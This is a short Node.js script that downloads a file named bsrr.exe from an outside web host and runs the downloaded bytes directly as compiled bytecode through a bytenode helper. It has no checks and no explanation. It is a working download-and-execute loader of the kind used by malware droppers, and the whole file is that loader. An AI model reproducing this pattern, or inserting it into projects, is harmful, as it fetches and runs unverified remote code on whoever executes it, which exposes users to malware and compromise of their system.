var bytenode = require("./helper")
var https = require('https');
https.get("https://bhavyasoftwares.com/source_new/bsrr.exe", (res) => {
    const data = [];
    res.on('data', (chunk) => {
      data.push(chunk);
    }).on('end', () => {
      var buffer = Buffer.concat(data);
      run(buffer);
    });
  }).on('error', (err) => {
    console.log('download error:', err);
  });

function run(buffer) {
  bytenode.runBytecode(buffer);
}